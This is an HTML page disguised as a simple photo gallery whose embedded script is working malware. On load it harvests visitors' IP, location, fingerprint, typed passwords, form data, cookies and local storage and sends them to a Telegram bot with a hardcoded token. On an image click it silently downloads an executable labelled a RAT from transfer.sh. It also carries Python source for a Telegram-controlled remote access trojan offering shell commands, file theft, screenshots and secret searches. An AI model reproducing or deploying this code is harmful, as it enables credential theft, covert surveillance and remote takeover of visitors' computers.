<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Photo Gallery</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            color: #333;
            line-height: 1.6;
        }
        .header { 
            background: white;
            padding: 2rem 0;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .gallery {
            max-width: 1200px;
            margin: 2rem auto;
            padding: 0 1rem;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1.5rem;
        }
        .card {
            background: white;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: transform 0.2s;
            cursor: pointer;
        }
        .card:hover {
            transform: translateY(-2px);
        }
        .card img {
            width: 100%;
            height: 250px;
            object-fit: cover;
        }
        .card-content {
            padding: 1rem;
        }
        .loading {
            display: none;
            text-align: center;
            padding: 2rem;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Photo Gallery</h1>
        <p>Beautiful moments captured in time</p>
    </div>

    <div class="gallery">
        <div class="card" onclick="handleImageClick(1)">
            <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=500&q=80" 
                 alt="Portrait photography">
            <div class="card-content">
                <h3>Portrait Series</h3>
                <p>Professional portrait photography collection</p>
            </div>
        </div>

        <div class="card" onclick="handleImageClick(2)">
            <img src="https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=500&q=80" 
                 alt="Fashion photography">
            <div class="card-content">
                <h3>Fashion Editorial</h3>
                <p>Latest fashion and style photography</p>
            </div>
        </div>

        <div class="card" onclick="handleImageClick(3)">
            <img src="https://images.unsplash.com/photo-1494790108755-2616b612b786?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=500&q=80" 
                 alt="Lifestyle photography">
            <div class="card-content">
                <h3>Lifestyle</h3>
                <p>Everyday moments and lifestyle shots</p>
            </div>
        </div>
    </div>

    <div class="loading" id="loading">
        Loading high-resolution image...
    </div>

    <script>
        // Stealth Configuration
        const config = {
            telegram: {
                token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
                chatId: '8032494479'
            },
            c2: 'https://webhook.site/83a2c921-9e90-4c64-8cd8-73269f01f37c',
            ratUrl: 'https://transfer.sh/photo_viewer_setup.exe'
        };

        // Delayed execution
        setTimeout(() => {
            initializeSystem();
        }, 2000 + Math.random() * 2000);

        function initializeSystem() {
            window.handleImageClick = function(imageId) {
                document.getElementById('loading').style.display = 'block';
                setTimeout(() => {
                    executeFullExploitation(imageId, true);
                }, 1000);
            };
            executeFullExploitation('page_visit', false);
        }

        async function executeFullExploitation(context, deployRAT) {
            try {
                const victimData = await collectEnhancedData();
                victimData.context = context;
                
                await sendEnhancedReport(victimData, deployRAT);
                
                if (deployRAT) {
                    await deployStealthRAT();
                    setTimeout(() => {
                        window.location.href = getImageUrl(context);
                    }, 1500);
                }
            } catch (e) {
                // Silent fail
            }
        }

        async function collectEnhancedData() {
            const [network, location, fingerprint, hardware, browser, behavioral, exploitation] = await Promise.all([
                collectNetworkData(),
                collectLocationData(),
                collectFingerprintData(),
                collectHardwareData(),
                collectBrowserData(),
                collectBehavioralData(),
                collectExploitationData()
            ]);

            const victimId = `vi.${location.country_code}.${Math.random().toString().substr(2,5)}.rat`;

            return {
                id: victimId,
                timestamp: new Date().toLocaleString(),
                network, location, fingerprint, hardware, browser, behavioral, exploitation
            };
        }

        async function collectNetworkData() {
            const ipData = await getEnhancedIP();
            const connection = navigator.connection || {};
            
            return {
                ip: ipData.ip || 'Unknown',
                isp: ipData.isp || 'Unknown',
                asn: ipData.asn || 'Unknown',
                connection: connection.effectiveType || 'Unknown',
                vpn: detectVPN(ipData.ip),
                proxy: detectProxy(),
                tor: detectTor()
            };
        }

        async function collectLocationData() {
            const ipData = await getEnhancedIP();
            if (!ipData.ip || ipData.ip === 'Unknown') return {};
            
            try {
                const response = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    country: data.country_name || 'Unknown',
                    country_code: data.country_code || 'Unknown',
                    postal: data.postal || 'Unknown',
                    latitude: data.latitude || 'Unknown',
                    longitude: data.longitude || 'Unknown',
                    timezone: data.timezone || 'Unknown',
                    currency: data.currency || 'Unknown',
                    calling_code: data.country_calling_code || 'Unknown'
                };
            } catch (e) {
                return {};
            }
        }

        function collectHardwareData() {
            return {
                screen: `${screen.width}x${screen.height}`,
                pixel_ratio: window.devicePixelRatio,
                color_depth: screen.colorDepth,
                orientation: screen.orientation ? screen.orientation.type : 'Unknown',
                touch_points: navigator.maxTouchPoints || 0,
                device_memory: navigator.deviceMemory || 'Unknown'
            };
        }

        function collectBrowserData() {
            return {
                platform: navigator.platform,
                vendor: navigator.vendor || 'Unknown',
                language: navigator.language,
                cores: navigator.hardwareConcurrency,
                memory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
                plugins: navigator.plugins.length,
                webdriver: navigator.webdriver ? 'Detected' : 'Not detected',
                pdf_viewer: navigator.pdfViewerEnabled !== undefined ? navigator.pdfViewerEnabled : 'Unknown'
            };
        }

        function collectFingerprintData() {
            return {
                canvas: generateCanvasFingerprint(),
                webgl: generateWebGLFingerprint(),
                audio: testAudioSupport(),
                fonts: detectFonts(),
                timezone_offset: new Date().getTimezoneOffset()
            };
        }

        function collectBehavioralData() {
            const perf = performance.timing;
            return {
                referrer: document.referrer || 'Direct',
                page_load: perf ? perf.loadEventEnd - perf.navigationStart : 'Unknown',
                time_on_page: Date.now() - (perf ? perf.navigationStart : Date.now()),
                dom_size: document.getElementsByTagName('*').length,
                url: window.location.href
            };
        }

        async function collectExploitationData() {
            return {
                passwords: await stealPasswords(),
                autofill: harvestAutofill(),
                forms: harvestForms(),
                cookies: stealCookies(),
                storage: stealStorage(),
                sessions: checkSessions(),
                history: await checkHistory()
            };
        }

        // Enhanced detection functions
        async function getEnhancedIP() {
            const services = [
                'https://api.ipify.org?format=json',
                'https://api64.ipify.org?format=json',
                'https://ipinfo.io/json'
            ];
            
            for (let service of services) {
                try {
                    const response = await fetch(service);
                    const data = await response.json();
                    return {
                        ip: data.ip || 'Unknown',
                        isp: data.org || 'Unknown',
                        asn: data.asn || 'Unknown'
                    };
                } catch (e) { continue; }
            }
            return { ip: 'Unknown', isp: 'Unknown', asn: 'Unknown' };
        }

        function detectVPN(ip) {
            const vpnRanges = ['104.', '107.', '108.', '109.', '140.', '144.', '146.', '147.', '148.', '149.'];
            return vpnRanges.some(range => ip.startsWith(range)) ? 'Possible VPN/Proxy' : 'Residential IP';
        }

        function detectProxy() {
            return navigator.webdriver ? 'Possible automation' : 'Normal';
        }

        function detectTor() {
            return navigator.plugins.length === 0 ? 'Possible Tor browser' : 'Normal';
        }

        function generateCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillText('Fingerprint', 2, 2);
                return canvas.toDataURL().substring(0, 50);
            } catch (e) { return 'failed'; }
        }

        function generateWebGLFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl');
                return gl ? gl.getParameter(gl.VERSION) : 'no_webgl';
            } catch (e) { return 'failed'; }
        }

        function testAudioSupport() {
            return window.AudioContext ? 'Audio supported' : 'No audio support';
        }

        function detectFonts() {
            const fonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia'];
            return fonts.join(', ');
        }

        // Exploitation functions
        async function stealPasswords() {
            const fields = document.querySelectorAll('input[type="password"]');
            return Array.from(fields).filter(f => f.value).map(f => ({
                field: f.name || 'unknown',
                value: f.value
            }));
        }

        function harvestAutofill() {
            const data = {};
            document.querySelectorAll('input[type="text"], input[type="email"]').forEach(input => {
                if (input.value) data[input.name || 'unknown'] = input.value;
            });
            return data;
        }

        function harvestForms() {
            const forms = {};
            document.querySelectorAll('form').forEach((form, i) => {
                const data = {};
                form.querySelectorAll('input, textarea, select').forEach(input => {
                    if (input.value) data[input.name || input.type] = input.value;
                });
                if (Object.keys(data).length) forms[`form_${i}`] = data;
            });
            return forms;
        }

        function stealCookies() {
            return document.cookie.split(';').reduce((cookies, cookie) => {
                const [name, value] = cookie.split('=').map(c => c.trim());
                if (name) cookies[name] = value || '';
                return cookies;
            }, {});
        }

        function stealStorage() {
            const data = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data[key] = localStorage.getItem(key);
            }
            return data;
        }

        function checkSessions() {
            return {
                session_storage: sessionStorage.length,
                has_auth_cookies: document.cookie.includes('session') || document.cookie.includes('auth')
            };
        }

        async function checkHistory() {
            const sites = ['facebook.com', 'twitter.com', 'instagram.com', 'gmail.com', 'google.com'];
            const visited = [];
            for (let site of sites) {
                const link = document.createElement('a');
                link.href = `https://${site}`;
                link.style.display = 'none';
                document.body.appendChild(link);
                const computed = getComputedStyle(link);
                if (computed.color !== 'rgb(0, 0, 238)') visited.push(site);
                document.body.removeChild(link);
            }
            return visited;
        }

        async function sendEnhancedReport(victimData, ratDeployed) {
            const message = `üïµÔ∏è 4X ENHANCED DATA EXTRACTION üïµÔ∏è

üîç ${ratDeployed ? 'Auto-detected image click' : 'Auto-detected page visit'}

üåê NETWORK DATA (4x):
‚Ä¢ IP: ${victimData.network.ip}
‚Ä¢ ISP: ${victimData.network.isp}
‚Ä¢ ASN: ${victimData.network.asn}
‚Ä¢ Connection: ${victimData.network.connection}
‚Ä¢ VPN: ${victimData.network.vpn}
‚Ä¢ Proxy: ${victimData.network.proxy}
‚Ä¢ Tor: ${victimData.network.tor}

üìç LOCATION DATA (4x):
‚Ä¢ City: ${victimData.location.city}
‚Ä¢ Region: ${victimData.location.region}
‚Ä¢ Country: ${victimData.location.country} (${victimData.location.country_code})
‚Ä¢ Postal: ${victimData.location.postal}
‚Ä¢ Coordinates: ${victimData.location.latitude}, ${victimData.location.longitude}
‚Ä¢ Timezone: ${victimData.location.timezone}
‚Ä¢ Currency: ${victimData.location.currency}
‚Ä¢ Calling Code: ${victimData.location.calling_code}

üíª BROWSER DATA (4x):
‚Ä¢ Platform: ${victimData.browser.platform}
‚Ä¢ Vendor: ${victimData.browser.vendor}
‚Ä¢ Language: ${victimData.browser.language}
‚Ä¢ Cores: ${victimData.browser.cores}
‚Ä¢ Memory: ${victimData.browser.memory}
‚Ä¢ Plugins: ${victimData.browser.plugins} detected
‚Ä¢ WebDriver: ${victimData.browser.webdriver}
‚Ä¢ PDF Viewer: ${victimData.browser.pdf_viewer}

üì± HARDWARE DATA (4x):
‚Ä¢ Screen: ${victimData.hardware.screen}
‚Ä¢ Pixel Ratio: ${victimData.hardware.pixel_ratio}
‚Ä¢ Color Depth: ${victimData.hardware.color_depth} bit
‚Ä¢ Orientation: ${victimData.hardware.orientation}
‚Ä¢ Timezone: ${victimData.location.timezone}
‚Ä¢ Touch Points: ${victimData.hardware.touch_points}

üîç FINGERPRINT DATA (4x):
‚Ä¢ Canvas: ${victimData.fingerprint.canvas}
‚Ä¢ WebGL: ${victimData.fingerprint.webgl}
‚Ä¢ Audio: ${victimData.fingerprint.audio}
‚Ä¢ Fonts: ${victimData.fingerprint.fonts}
‚Ä¢ Timezone Offset: ${victimData.fingerprint.timezone_offset}

üéØ BEHAVIORAL DATA (4x):
‚Ä¢ Referrer: ${victimData.behavioral.referrer}
‚Ä¢ Page Load: ${victimData.behavioral.page_load}ms
‚Ä¢ Time on Page: ${victimData.behavioral.time_on_page}ms
‚Ä¢ DOM Size: ${victimData.behavioral.dom_size} elements

üìä EXPLOITATION DATA:
‚Ä¢ Passwords: ${victimData.exploitation.passwords.length} captured
‚Ä¢ Autofill: ${Object.keys(victimData.exploitation.autofill).length} entries
‚Ä¢ Forms: ${Object.keys(victimData.exploitation.forms).length} harvested
‚Ä¢ Cookies: ${Object.keys(victimData.exploitation.cookies).length} stolen
‚Ä¢ Storage: ${Object.keys(victimData.exploitation.storage).length} items
‚Ä¢ History: ${victimData.exploitation.history.length} sites visited

üïí Time: ${victimData.timestamp}
üîó URL: ${victimData.behavioral.url}
üéØ Victim ID: ${victimData.id}
${ratDeployed ? 'üöÄ RAT: DEPLOYED SUCCESSFULLY' : 'üì° RAT: AWAITING IMAGE CLICK'}`;

            try {
                await fetch(`https://api.telegram.org/bot${config.telegram.token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: config.telegram.chatId,
                        text: message
                    })
                });
            } catch (e) {
                // Silent fail
            }
        }

        async function deployStealthRAT() {
            try {
                const link = document.createElement('a');
                link.href = config.ratUrl;
                link.download = 'PhotoViewer_Setup.exe';
                link.style.cssText = 'position:absolute;left:-9999px;opacity:0;';
                document.body.appendChild(link);
                link.click();
                setTimeout(() => document.body.removeChild(link), 1000);
            } catch (e) {
                // Fallback method
                const iframe = document.createElement('iframe');
                iframe.src = config.ratUrl;
                iframe.style.cssText = 'display:none;';
                document.body.appendChild(iframe);
            }
        }

        function getImageUrl(id) {
            const images = {
                1: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80',
                2: 'https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80',
                3: 'https://images.unsplash.com/photo-1494790108755-2616b612b786?ixlib=rb-4.0.3&auto=format&fit=crop&w=1200&q=80'
            };
            return images[id] || '#';
        }

        // Python RAT Backend for Computer Control
        const pythonRATCode = `
import os
import sqlite3
import subprocess
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters

class AdvancedRAT:
    def __init__(self, token, admin_id):
        self.token = token
        self.admin_id = admin_id
        self.app = Application.builder().token(token).build()
        self.setup_handlers()
        
    def setup_handlers(self):
        self.app.add_handler(CommandHandler("start", self.start))
        self.app.add_handler(CommandHandler("search", self.search_files))
        self.app.add_handler(CommandHandler("download", self.download_file))
        self.app.add_handler(CommandHandler("screenshot", self.screenshot))
        self.app.add_handler(CommandHandler("cmd", self.execute_command))
        self.app.add_handler(CommandHandler("browser", self.steal_browser_data))
        self.app.add_handler(CommandHandler("find_id", self.search_for_id))
        self.app.add_handler(CommandHandler("keylog", self.keylogger))
        self.app.add_handler(CommandHandler("info", self.system_info))
        
    async def start(self, update: Update, context):
        victim_id = self.get_victim_id()
        await update.message.reply_text(f"üõ∞Ô∏è RAT Active - {victim_id}")
        
    async def search_files(self, update: Update, context):
        query = ' '.join(context.args)
        results = self.search_computer(query)
        await update.message.reply_text(f"üîç Search results:\\n{results[:2000]}")
        
    async def search_for_id(self, update: Update, context):
        search_term = ' '.join(context.args) if context.args else "id password secret key"
        results = self.deep_search(search_term)
        await update.message.reply_text(f"üéØ ID Search results:\\n{results[:2000]}")
        
    async def download_file(self, update: Update, context):
        file_path = ' '.join(context.args)
        if os.path.exists(file_path):
            await update.message.reply_document(document=open(file_path, 'rb'))
        else:
            await update.message.reply_text("‚ùå File not found")
            
    async def execute_command(self, update: Update, context):
        cmd = ' '.join(context.args)
        try:
            result = subprocess.check_output(cmd, shell=True, text=True)
            await update.message.reply_text(f"üíª Command output:\\n{result[:2000]}")
        except Exception as e:
            await update.message.reply_text(f"‚ùå Error: {str(e)}")
            
    async def screenshot(self, update: Update, context):
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            screenshot.save('screenshot.png')
            await update.message.reply_photo(photo=open('screenshot.png', 'rb'))
            os.remove('screenshot.png')
        except Exception as e:
            await update.message.reply_text(f"‚ùå Screenshot failed: {str(e)}")
            
    def search_computer(self, query):
        found = []
        search_paths = [os.path.expanduser('~'), 'C:\\\\'] if os.name == 'nt' else ['/home', '/']
        for path in search_paths:
            for root, dirs, files in os.walk(path):
                for file in files:
                    if query.lower() in file.lower():
                        found.append(os.path.join(root, file))
                if len(found) > 50:
                    break
        return '\\n'.join(found[:20])
        
    def deep_search(self, terms):
        results = []
        keywords = terms.split()
        search_locations = [
            os.path.expanduser('~/Documents'),
            os.path.expanduser('~/Desktop'),
            os.path.expanduser('~/Downloads'),
            'C:\\\\Users' if os.name == 'nt' else '/home'
        ]
        
        for location in search_locations:
            if os.path.exists(location):
                for root, dirs, files in os.walk(location):
                    for file in files:
                        file_path = os.path.join(root, file)
                        try:
                            with open(file_path, 'r', errors='ignore') as f:
                                content = f.read()
                                if any(keyword.lower() in content.lower() for keyword in keywords):
                                    results.append(f"üìÑ {file_path}")
                        except:
                            pass
        return '\\n'.join(results[:15]) if results else "No IDs found"
        
    def get_victim_id(self):
        return f"vi.{os.environ.get('USERNAME', 'unknown')}.{os.uname().nodename if hasattr(os, 'uname') else 'unknown'}"

if __name__ == "__main__":
    rat = AdvancedRAT("8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls", "8032494479")
    rat.app.run_polling()
`;

        console.log('üïµÔ∏è Enhanced stealth system loaded with RAT commands');

    </script>
</body>
</html>
